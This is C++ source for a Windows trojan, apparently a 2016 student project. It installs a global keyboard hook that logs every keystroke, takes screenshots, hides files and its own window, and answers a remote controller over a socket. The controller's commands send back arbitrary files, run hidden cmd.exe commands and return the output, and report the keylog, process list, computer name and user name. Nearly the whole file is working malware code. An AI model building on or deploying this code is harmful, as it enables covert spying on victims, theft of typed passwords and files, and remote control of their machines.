/*
author: Forec
create_date: 2016-09-15
email: forec@bupt.edu.cn
*/

#include "trojan.h"

HANDLE hMutex = CreateMutex(NULL, FALSE, NULL);

inline LPCWSTR stringToLPCWSTR(const char *src){
	size_t srcsize = strlen(src) + 1;
	size_t convertedChars = 0;
	wchar_t *wcstring = (wchar_t *)malloc(sizeof(wchar_t)*(strlen(src) - 1));
	mbstowcs_s(&convertedChars, wcstring, srcsize, src, _TRUNCATE);
	return wcstring;
}

unsigned int send_s(SOCKET &sock, char *buf, INT32 sendlen){
	char * temp = new char[sendlen + 4];
	/* content check */
	memcpy(temp, "FLAG", 4);
	if (buf){
		memcpy(temp + 4, buf, sendlen);
	}
	int realSendLen = send(sock, temp, sendlen + 4, 0);
	delete temp;
	return realSendLen - 4 >= 0 ? realSendLen : 0;
}

unsigned int readFileIntoBuf(FILE **fp, char *buf, unsigned int buflen){	// server
	size_t readLen = 0, index = 0;
	while ((readLen = fread(buf + index, sizeof(char), buflen - 4 - index, *fp)) != 0){
		index += readLen;
		if (index == buflen - 4){
			break;
		}
	}
	return index;
}

bool sendFile(SOCKET &socket, char *path){
	FILE *fp;
	int error = fopen_s(&fp, path, "rb");
	if (error != 0)
		return false;
	char send_buf[SEND_BUFLEN];
	unsigned int readLen = 0;
	do {
		readLen = readFileIntoBuf(&fp, send_buf, SEND_BUFLEN);
		send_s(socket, send_buf, readLen);
	} while (readLen);
	fclose(fp);
	return true;
}

bool hideFile(const char *path){
	if (SetFileAttributes(stringToLPCWSTR(path), FILE_ATTRIBUTE_HIDDEN) != 0)
		return true;
	return false;
}

bool registerIP(char *info){
	return true;
}

bool getScreenShot(const char *path){
	HANDLE hDIB, file;
	DWORD dwBmpSize, dwSizeofDIB, dwBytesWritten;
	HBITMAP hbmScreen = NULL;
	BITMAP bmpScreen;
	BITMAPFILEHEADER bmfHeader;
	BITMAPINFOHEADER bi;
	char *lpbitmap;
	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);
	HDC hdcScreen = GetDC(NULL); // DC for whole screen
	HDC hdcMemDC = CreateCompatibleDC(hdcScreen);

	if (!hdcMemDC){
		DeleteObject(hbmScreen);
		DeleteObject(hdcMemDC);
		ReleaseDC(NULL, hdcScreen);
		return false;
	}

	hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);

	if (!hbmScreen){
		DeleteObject(hbmScreen);
		DeleteObject(hdcMemDC);
		ReleaseDC(NULL, hdcScreen);
		return false;
	}

	SelectObject(hdcMemDC, hbmScreen);
	if (!BitBlt(
		hdcMemDC,			// target DC
		0, 0,				// coordinates of target DC
		width, height,		// width, height of DC
		hdcScreen,			// source DC
		0, 0,				// coordinates of source DC
		SRCCOPY)){			// copy method
		DeleteObject(hbmScreen);
		DeleteObject(hdcMemDC);
		ReleaseDC(NULL, hdcScreen);
		return false;
	}

	GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = bmpScreen.bmWidth;
	bi.biHeight = bmpScreen.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

	hDIB = GlobalAlloc(GHND, dwBmpSize);
	lpbitmap = (char *)GlobalLock(hDIB);

	GetDIBits(
		hdcScreen,					// device handle
		hbmScreen,					// bmp handle
		0,							// first scan line of index
		(UINT)bmpScreen.bmHeight,	// lines of index
		lpbitmap,					// pointer to buf of index
		(BITMAPINFO *)&bi,			// data structual
		DIB_RGB_COLORS				// RGB
		);

	file = CreateFile(
		stringToLPCWSTR(path),
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);
	if (file == INVALID_HANDLE_VALUE){
		return false;
	}

	dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER);
	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER)+(DWORD)sizeof(BITMAPINFOHEADER);
	bmfHeader.bfSize = dwSizeofDIB;
	bmfHeader.bfType = 0x4D42;
	dwBytesWritten = 0;
	WriteFile(file, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
	WriteFile(file, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
	WriteFile(file, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

	GlobalUnlock(hDIB);
	GlobalFree(hDIB);
	CloseHandle(file);

	DeleteObject(hbmScreen);
	DeleteObject(hdcMemDC);
	ReleaseDC(NULL, hdcScreen);

	return true;
}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
	int press = p->vkCode;

	if (strlen(keyBuffer) >= KEY_BUFLEN - 13){
		FILE *fp;
		int error = fopen_s(&fp, "keyboard.log", "a");
		if (error != 0){
			return CallNextHookEx(hook, nCode, wParam, lParam);
		}
		fprintf(fp, "%s", keyBuffer);
		fflush(fp);
		fclose(fp);
		memset(keyBuffer, 0, KEY_BUFLEN);
	}

	if (nCode >= 0 && wParam == WM_KEYDOWN){
		/* F1 - F12 */
		if (press >= 112 && press <= 135){
			sprintf_s(keyBuffer + strlen(keyBuffer), KEY_BUFLEN, "F%d ", press - 111);
		}
		/* Num 0 - 9 and letters */
		else if ((press >= 48 && press <= 57) ||
			(press >= 65 && press <= 90)){
			sprintf_s(keyBuffer + strlen(keyBuffer), KEY_BUFLEN, "%c ", press);
		}
		/* M0 - M9 */
		else if ((press >= 96 && press <= 105)){
			sprintf_s(keyBuffer + strlen(keyBuffer), KEY_BUFLEN, "%c ", press - 48);
		}
		else switch (press){
		case  8:strcat_s(keyBuffer, KEY_BUFLEN, "Backspace ");	break;
		case  9:strcat_s(keyBuffer, KEY_BUFLEN, "Tab ");			break;
		case 13:strcat_s(keyBuffer, KEY_BUFLEN, "Enter ");		break;
		case 18:strcat_s(keyBuffer, KEY_BUFLEN, "Alt ");			break;
		case 19:strcat_s(keyBuffer, KEY_BUFLEN, "Pause ");		break;
		case 20:strcat_s(keyBuffer, KEY_BUFLEN, "CapsLk ");		break;
		case 27:strcat_s(keyBuffer, KEY_BUFLEN, "Esc ");			break;
		case 32:strcat_s(keyBuffer, KEY_BUFLEN, "Space ");		break;
		case 33:strcat_s(keyBuffer, KEY_BUFLEN, "PgUp ");			break;
		case 34:strcat_s(keyBuffer, KEY_BUFLEN, "PgDn ");			break;
		case 35:strcat_s(keyBuffer, KEY_BUFLEN, "End ");			break;
		case 36:strcat_s(keyBuffer, KEY_BUFLEN, "Home ");			break;
		case 37:strcat_s(keyBuffer, KEY_BUFLEN, "Left ");			break;
		case 38:strcat_s(keyBuffer, KEY_BUFLEN, "Up ");			break;
		case 39:strcat_s(keyBuffer, KEY_BUFLEN, "Right ");		break;
		case 40:strcat_s(keyBuffer, KEY_BUFLEN, "Down ");			break;
		case 44:strcat_s(keyBuffer, KEY_BUFLEN, "PrtSc ");		break;
		case 45:strcat_s(keyBuffer, KEY_BUFLEN, "Ins ");			break;
		case 46:strcat_s(keyBuffer, KEY_BUFLEN, "Del ");			break;
		case  91:
		case  92:strcat_s(keyBuffer, KEY_BUFLEN, "Windows ");		break;
		case  16:
		case 160:
		case 161:strcat_s(keyBuffer, KEY_BUFLEN, "Shift ");		break;
		case  17:
		case 162:
		case 163:strcat_s(keyBuffer, KEY_BUFLEN, "Ctrl ");		break;
		case 106:strcat_s(keyBuffer, KEY_BUFLEN, "* ");			break;
		case 107:strcat_s(keyBuffer, KEY_BUFLEN, "+ ");			break;
		case 109:strcat_s(keyBuffer, KEY_BUFLEN, "- ");			break;
		case 110:strcat_s(keyBuffer, KEY_BUFLEN, ". ");			break;
		case 111:strcat_s(keyBuffer, KEY_BUFLEN, "/ ");			break;
		case 186:strcat_s(keyBuffer, KEY_BUFLEN, "; ");			break;
		case 187:strcat_s(keyBuffer, KEY_BUFLEN, "= ");			break;
		case 188:strcat_s(keyBuffer, KEY_BUFLEN, ", ");			break;
		case 189:strcat_s(keyBuffer, KEY_BUFLEN, "- ");			break;
		case 190:strcat_s(keyBuffer, KEY_BUFLEN, ". ");			break;
		case 191:strcat_s(keyBuffer, KEY_BUFLEN, "/ ");			break;
		case 192:strcat_s(keyBuffer, KEY_BUFLEN, "` ");			break;
		case 219:strcat_s(keyBuffer, KEY_BUFLEN, "[ ");			break;
		case 220:strcat_s(keyBuffer, KEY_BUFLEN, "\\ ");			break;
		case 221:strcat_s(keyBuffer, KEY_BUFLEN, "] ");			break;
		case 222:strcat_s(keyBuffer, KEY_BUFLEN, "\' ");			break;
		case 255:strcat_s(keyBuffer, KEY_BUFLEN, "Fn ");			break;
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam){
	switch (msg){
	case WM_PAINT:	break;
	case WM_CLOSE:	DestroyWindow(hwnd);break;
	case WM_DESTROY:PostQuitMessage(0);break;
	default:		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

void RegisterTrojanWindow(HINSTANCE hInstance){
	WNDCLASSEX wc;
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WindowProc; 
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;
	wc.lpszClassName =  stringToLPCWSTR(g_szClassName);
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassEx(&wc)){
		exit(0);
	}
}

HWND CreateTrojanWindow(HINSTANCE hInstance){
	HWND hwnd;
	hwnd = CreateWindowEx(
		WS_EX_CLIENTEDGE,
		stringToLPCWSTR(g_szClassName),
		TEXT("Trojan"),
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 400, 300,
		NULL, NULL, hInstance, NULL);

	if (!hwnd){
		exit(0);
	}
	ShowWindow(hwnd, SW_HIDE);
	UpdateWindow(hwnd);

	return hwnd;
}

DWORD WINAPI ThreadProc(LPVOID lpThreadParameter){
	HINSTANCE hInstance;
	hInstance = *(HINSTANCE*)lpThreadParameter;
	MSG Msg;
	RegisterTrojanWindow(hInstance);
	CreateTrojanWindow(hInstance);
	hook = SetWindowsHookEx(
		WH_KEYBOARD_LL, // listen : keyboard
		KeyboardProc,   // function
		hInstance,      // handle
		0               // NULL : listen all input
		);
	if (!hook){
		return -1;
	}

	while (GetMessage(&Msg, NULL, 0, 0) > 0){
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	return 0;
}

bool getCurrentProcesses(char *buf, const unsigned int buflen) {
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE shot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (shot == INVALID_HANDLE_VALUE){
		return false;
	}
	if (!Process32First(shot, &pe32)){
		CloseHandle(shot);
		return false;
	}
	memset(buf, 0, buflen);
	do {
		sprintf_s(buf + strlen(buf),
			buflen,
			"%s\t %u\t %d\t %d\t %u\n",
			pe32.szExeFile,
			pe32.th32ParentProcessID,
			pe32.cntThreads,
			pe32.pcPriClassBase,
			pe32.th32ProcessID
			);
	} while (Process32Next(shot, &pe32));
	CloseHandle(shot);
	return true;
}

bool runCommand(char *cmdStr, SOCKET &sock){
	DWORD readByte = 0;
	char command[CMD_BUFLEN] = "\0", cmd_buf[CMD_BUFLEN] = "\0";
	int bsize = 0;
	bool first = true;

	HANDLE hRead, hWrite;
	STARTUPINFO si;         // config startup info
	PROCESS_INFORMATION pi; // process info
	SECURITY_ATTRIBUTES sa; // tunnel security

	sprintf_s(command, CMD_BUFLEN, "cmd.exe /c %s", cmdStr);

	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hRead, &hWrite, &sa, CMD_BUFLEN)){
		return false;
	}

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si); 
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
	si.wShowWindow = SW_HIDE;					// hide window
	si.hStdOutput = si.hStdError = hWrite;		// set output stream to pipe
	
	TCHAR wcommand[CMD_BUFLEN * 2];
	MultiByteToWideChar(0, 0, command, CMD_BUFLEN, wcommand, CMD_BUFLEN*2);

	if ( !CreateProcess(NULL,	
						wcommand, 
						NULL,			
						NULL,	
						TRUE,	
						0,	
						NULL,	
						NULL,		
						&si,		
						&pi))	{
		CloseHandle(hRead);
		CloseHandle(hWrite);
		return false;
	}
	CloseHandle(hWrite);

	while (ReadFile(hRead, cmd_buf + bsize, CMD_BUFLEN - bsize, &readByte, NULL)){
		if (!readByte){
			if (first)
				first = false;
			break;
		}
		bsize = strlen(cmd_buf);
		if (bsize == CMD_BUFLEN){
			send_s(sock, cmd_buf, bsize + 1);
			memset(cmd_buf, 0, bsize);
			bsize = 0;
		}
	}
	if (bsize > 0){
		send_s(sock, cmd_buf, bsize + 1);
		memset(cmd_buf, 0, bsize);
		bsize = 0;
	}
	send_s(sock, NULL, 0);
	CloseHandle(hRead);
	return true;
}

bool sendSystemInfo(SOCKET &socket){
	OSVERSIONINFOEX os;

	char temp[INFO_BUFLEN] = "\0", info[INFO_BUFLEN] = "\0";
	DWORD namesize;
	os.dwOSVersionInfoSize = sizeof(os);

	if (true){//!GetVersionEx((LPOSVERSIONINFOW)&os)){
		strcpy_s(temp,  INFO_BUFLEN, "Unknown");
	} else{
		if (os.dwMajorVersion == 6){
			if (os.dwMinorVersion == 2)
				strcpy_s(temp, INFO_BUFLEN, "Windows 8");
			else if (os.dwMinorVersion == 1){
				if (os.wProductType == VER_NT_WORKSTATION)
					strcpy_s(temp, INFO_BUFLEN, "Windows 7");
				else
					strcpy_s(temp, INFO_BUFLEN, "Microsoft Windows Server 2008 R2");
			}
			else if (os.dwMinorVersion == 0){
				if (os.wProductType == VER_NT_WORKSTATION)
					strcpy_s(temp, INFO_BUFLEN, "Microsoft Windows Vista");
				else
					strcpy_s(temp, INFO_BUFLEN, "Microsoft Windows Server 2008");
			}
		}
		else if (os.dwMajorVersion == 5){
			if (os.dwMinorVersion == 2)
				strcpy_s(temp, INFO_BUFLEN, "Windows Server 2003");
			else if (os.dwMinorVersion == 1)
				strcpy_s(temp, INFO_BUFLEN, "Windows XP");
			else if (os.dwMinorVersion == 0)
				strcpy_s(temp, INFO_BUFLEN, "Windows 2000");
		}
	}
	sprintf_s(info, INFO_BUFLEN, "version: %s", temp);
	memset(temp, 0, INFO_BUFLEN);

	if (!GetComputerName((LPWSTR)temp, &namesize)){
		strcpy_s(temp, INFO_BUFLEN, "Unknown");
	}
	strcat_s(info, INFO_BUFLEN, "\nPC :");
	strcat_s(info, INFO_BUFLEN, temp);
	memset(temp, 0, INFO_BUFLEN);

	if (!GetUserName((LPWSTR)temp, &namesize)){
		strcpy_s(temp, INFO_BUFLEN, "Unknown");
	}
	strcat_s(info, INFO_BUFLEN, "\nUser: ");
	strcat_s(info, INFO_BUFLEN, temp);

	if (send_s(socket, info, strlen(info) + 1) != SOCKET_ERROR)
		return true;
	return false;
}

bool dealWithCommand(char *sendBuf, char *recvBuf, int recvLen, SOCKET& socket){
	WaitForSingleObject(hMutex, INFINITE);

	memset(sendBuf, 0, SEND_BUFLEN);
	if (!strncmp(recvBuf, "GETFILE", 7)){
		strncpy_s(sendBuf, SEND_BUFLEN, recvBuf + 7, recvLen - 7);
		return sendFile(socket, sendBuf);
	}
	else if (!strncmp(recvBuf, "RUNCMD", 6)){
		strncpy_s(sendBuf, SEND_BUFLEN, recvBuf + 6, recvLen - 6);
		return runCommand(sendBuf, socket);
	}
	else if (!strncmp(recvBuf, "PCINFO", 6)){
		return sendSystemInfo(socket);
	}
	else if (!strncmp(recvBuf, "KEYBOARD", 8)){
		FILE *fp;
		int error = fopen_s(&fp, keyboard_save_file, "a");
		if (error != 0){
			return false;
		}
		fprintf(fp, "%s", keyBuffer);
		fflush(fp);
		fclose(fp);
		memset(keyBuffer, 0, KEY_BUFLEN);
		sprintf_s(sendBuf, SEND_BUFLEN, "type %s", keyboard_save_file);
		return runCommand(sendBuf, socket);
	}
	else if (!strncmp(recvBuf, "PSLIST", 6)){
		if (getCurrentProcesses(sendBuf, SEND_BUFLEN)){
			return send_s(socket, sendBuf, strlen(sendBuf) + 1) > 0 ? true : false;
		}
		else{
			return false;
		}
	}
	else if (!strncmp(recvBuf, "SCREENSHOT", 10)){
		if (getScreenShot(screenshot_save_file)){
			send_s(socket, "SCREENSHOT SUCCEED", strlen("SCREENSHOT SUCCEED") + 1);
			return true;
		}
		else{
			send_s(socket, "SCREENSHOT FAILED", strlen("SCREENSHOT FAILED") + 1);
			return false;
		}
	}
	else{
		send_s(socket, "UNKNOWN COMMAND", strlen("UNKNOWN COMMAND") + 1);
		return false;
	}
	ReleaseMutex(hMutex);
}